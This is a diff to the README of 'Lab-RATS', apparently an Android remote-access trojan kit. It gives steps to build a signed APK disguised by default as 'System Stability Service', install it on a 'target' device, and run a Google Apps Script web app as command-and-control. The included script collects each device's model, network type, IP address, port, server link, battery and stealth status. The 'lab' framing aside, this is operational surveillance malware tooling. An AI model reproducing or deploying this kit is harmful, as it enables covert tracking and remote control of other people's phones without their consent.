@@ -81,10 +81,10 @@
 
 ### 2. Build the APK (on PC)
 1.  **Download & Extract** the repository.
-2.  Navigate to `cd /Lab-RATS-main/app-builder/`
+2.  Navigate to `cd /Lab-RATS-main/apk-builder/`
 3.  **Execute** the builder: chmod +x build.sh && ./build.sh` (Mac/Linux) or `build.bat` (Windows).
-4.  Enter your **App Name** and **Google Sheet URL**. *(Google Sheet Setup Instructions Below)*
-4.  Retrieve your `signed.apk` from the `/app-builder/output/` directory.
+4.  Enter your **App Name** (Default: *System Stability Service*) and **Google Sheet URL**. *(Google Sheet Setup Instructions Below)*
+4.  Retrieve your `signed.apk` from the `/apk-builder/output/` directory.
 
 ### 3. Install APK on Target Device
 1.  **Install** the `signed.apk` onto the **Target Android device**.
@@ -107,24 +107,52 @@
 ## 📊 Google Sheet C2 Setup Instructions (Advanced v1.4)
 
 1.  **Create** a new **Google Sheet**.
-2.  Go to **Extensions** → **Apps Script** and paste **this Snippet**:
+2.  Go to **Extensions** → **Apps Script** and paste **this Hybrid Snippet** (supports both GET and POST):
 
 ```javascript
+function doGet(e) {
+  return handleRequest(e);
+}
+
 function doPost(e) {
+  return handleRequest(e);
+}
+
+function handleRequest(e) {
   try {
     var ss = SpreadsheetApp.getActiveSpreadsheet();
-    var sheet = ss.getSheetByName("LabRATS Logs") || ss.getSheets()[0];
-    var data = JSON.parse(e.postData.contents);
     
+    // Check if script is correctly bound to a sheet
+    if (!ss) {
+      return ContentService.createTextOutput("ERROR: Script not bound to a spreadsheet. Create it from WITHIN the Google Sheet (Extensions -> Apps Script)").setMimeType(ContentService.MimeType.TEXT);
+    }
+
+    var sheet = ss.getSheetByName("LabRATS Logs");
+    if (!sheet) {
+      sheet = ss.insertSheet("LabRATS Logs");
+      sheet.appendRow(["Timestamp", "Device", "Network", "IP", "Port", "Link", "Battery", "Stealth Status"]);
+    }
+    
+    var data = {};
+    
+    // Handle POST (JSON body)
+    if (e.postData && e.postData.contents) {
+      data = JSON.parse(e.postData.contents);
+    } 
+    // Handle GET (URL parameters)
+    else if (e.parameter) {
+      data = e.parameter;
+    }
+
     var rowData = [
-      new Date(),       // A: Date & Time
-      data.device,     // B: Device Model #
-      data.network,    // C: Connection Type
-      data.ip,         // D: IP Address
-      data.port,       // E: Port #
-      data.link,       // F: Active Web Server URL Link
-      data.battery,    // G: Battery
-      data.stealth ? "ACTIVE" : "OFF" // H: Stealth Status
+      new Date(),
+      data.device || "Unknown",
+      data.network || "Unknown",
+      data.ip || "Unknown",
+      data.port || "8080",
+      data.link || "Unknown",
+      data.battery || "Unknown",
+      (data.stealth === true || data.stealth === "true") ? "ACTIVE" : "OFF"
     ];
     
     sheet.appendRow(rowData);
@@ -134,8 +162,8 @@ function doPost(e) {
   }
 }
 ```
-3.  **Deploy** → **Web App** → **Execute as Me** → **Access Anyone**.
-4.  **Paste** the **Generated URL** into the **apk-builder** when prompted.
+3.  **Deploy** → **New Deployment** → **Web App** → **Execute as Me** → **Who has access: Anyone**.
+4.  **Important**: Copy the **Web App URL** and paste it into the **apk-builder** when prompted.
 
 ### 📊 Example Google Sheet Configured:
 
